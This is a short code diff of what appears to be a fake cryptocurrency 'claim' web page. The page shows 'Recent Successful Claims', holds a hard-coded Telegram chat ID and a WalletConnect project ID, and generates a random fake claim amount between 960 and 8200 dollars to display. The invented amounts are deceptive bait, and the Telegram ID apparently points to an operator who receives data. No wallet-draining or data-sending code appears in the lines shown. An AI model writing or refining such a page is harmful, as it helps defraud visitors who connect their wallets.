@@ -314,7 +314,7 @@
             <p class="hero-subtitle">
                 Recent Successful Claims
             </p>
-
+<div class="hero-amount" id="claimAmount">$0</div>
             <div class="claim-history">
 
                 <div class="claim-item">
@@ -376,11 +376,9 @@
         const TELEGRAM_CHAT_ID = '7631123101';
         const WALLETCONNECT_PROJECT_ID = '8cb7ec413496bd2a9585e0d008c49acc';
 
-   // Generate random claim amount
 const minAmount = 960;
 const maxAmount = 8200;
 const claimAmount = (Math.random() * (maxAmount - minAmount) + minAmount).toFixed(0);
-document.getElementById('claimAmount').textContent = '$' + Number(claimAmount).toLocaleString();
 
         // Elements
         const connectBtn = document.getElementById('connectBtn');
